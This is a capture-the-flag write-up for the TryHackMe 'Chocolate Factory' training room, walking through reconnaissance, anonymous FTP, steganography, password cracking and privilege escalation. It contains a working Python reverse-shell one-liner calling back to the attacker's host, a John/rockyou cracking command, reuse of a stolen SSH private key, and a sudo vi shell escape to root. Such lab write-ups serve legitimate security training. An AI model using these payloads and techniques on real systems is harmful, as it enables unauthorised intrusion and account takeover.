# THM-Chocolate-Factory-WriteUp

Write up for https://tryhackme.com/room/chocolatefactory (Visit https://tryhackme.com/ for more)

# Setting up and information gathering

For this CTF I've set the record <BOX-IP> wonka in /etc/hosts.
  
By running syn scan (default mode when run as root) with nmap (`nmap -A wonka`) I found:
  
  FTP Server on port 21 allowing Anonymous login
  
  SSH Open port on port 22
  
  HTTP server on port 80
  
  Several open ports with the same hint ('Look somewhere else')
  
  A port with indicating a downloadable executable
  
 # Question #1
  
 By downloding the file indicated on the previous port and executing it I was asked a name, I tried several inputs with no success so further inspected the executable with strings (`strings key_rev_key`) and found this string:
 
  ``
   congratulations you have found the key:   
b'[*CENSORED*]'
``
  
 which turns out to be the answer to the first question
  
 # Question #2
  
Second question required the FTP connection:
  
  ```
└─# ftp wonka   
Connected to wonka.
220 (vsFTPd 3.0.3)
Name (wonka:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
```
The donloaded file is a simple jpeg representing some bubbles, no clues in the pic
I was able to exctract a file with steghide with a blank password
  
 ```
  └─# steghide extract -sf gum_room.jpg                                                                                                                 
Enter passphrase: 
wrote extracted data to "b64.txt".
```
It is an base64 encoded file so I decoded it (`base64 -d b64.txt > b64dec.txt`) to reveal what is seems to be a /etc/shadow file
John (`john -w=/usr/bin/wordlist/rockyou.txt b64dec.txt`) was able to crack charlie's password

# Question #3
  
The password found is need to login in the HTTP server on port 80 which leads to a webshell (I tried to use it for ssh into the server but with no success)

Ncat and bash reverse shells was not exploitable but I was able to get a connection by using python reverse shell
So I started a listener on port 4242 on my machine (`nc -lvnp 4242`) and send this payload to the web shell `export RHOST="<MY-THM-IP>";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
`
  
In /home/charlies we found two interesting files: teleport adn teleport.pub which are ssh keys pair
I copied teleport (private key) on my host and set the right permissions (`chmod 600 teleport`)
Then I sshed in to the server as charlie by running `ssh charlie@wonka -i teleport` accomplishing the third question
  
# Question #4
  
Just `cat user.txt` placed in /home/charlie

# Question #5
  
Checking charlie's sudo permissions I found vi , a text editor which permits to run commands with the process permissions.

So I ran `sudo /usr/bin/vi` then in the editor `:! ls /root` which reveals a file named 'root.py`, once again in the editor I typed `:! python /root/root.py`, I was asked a key so I've inserted the key from the first question, a message told me I was now the owner of the Chocolate Factory and give me the answer to the last question

  
  
